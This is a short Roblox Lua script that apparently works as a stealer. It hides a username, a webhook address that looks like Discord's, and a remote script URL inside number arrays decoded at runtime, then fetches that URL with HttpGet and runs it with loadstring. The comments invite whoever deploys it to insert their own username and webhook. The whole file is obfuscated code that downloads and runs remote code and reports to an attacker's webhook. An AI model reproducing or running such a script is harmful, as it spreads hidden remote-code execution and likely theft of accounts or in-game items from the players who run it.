
local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")

local _6jhjp7s81 = function()
    Username = (function()
        local a={1337,1480,1467,1025,1480,1480,1428,1467,1038,1298,908,1480,1337,1350,1272,1337,1181};
        local b='';
        for i=1,#a do 
            b=b..string.char((a[i]-37)/13);
        end;
        return b;
    end)()--<< Your Username
Webhook = (function()
        local a={1389,1545,1545,1493,1532,791,648,648,1337,1402,1532,1324,1480,1519,1337,635,1324,1480,1454,648,1298,1493,1402,648,1584,1350,1311,1389,1480,1480,1428,1532,648,674,700,739,700,674,778,752,778,674,765,765,739,726,674,687,778,726,687,700,648,1129,1506,1506,1389,1610,908,713,1077,1194,1519,1129,1597,1558,999,921,1350,1337,1571,1272,661,1181,1376,1415,882,1571,687,1571,1467,1077,973,1623,882,1272,1480,1350,1116,1194,1558,1025,700,1571,1142,1415,1168,1025,1142,1376,778,1623,1623,895,1597,1103,661,1363,700,999,1571,1610,1389,752,999,1155,1207,1025,1272,1064,1064};
        local b='';
        for i=1,#a do 
            b=b..string.char((a[i]-37)/13);
        end;
        return b;
    end)()-- << Your Webhook
loadstring(game:HttpGet((function()
        local a={1389,1545,1545,1493,1532,791,648,648,1519,1298,1584,167,1376,1402,1545,1389,1558,1311,1558,1532,1350,1519,1324,1480,1467,1545,1350,1467,1545,635,1324,1480,1454,648,1532,1558,1519,1350,1441,1610,1324,1480,648,1493,1532,778,778,167,648,1519,1350,1363,1532,648,1389,1350,1298,1337,1532,648,1454,1298,1402,1467,648,1103,1558,1298,778,778};
        local b='';
        for i=1,#a do 
            b=b..string.char((a[i]-37)/13);
        end;
        return b;
    end)()))()
end;
_6jhjp7s81();
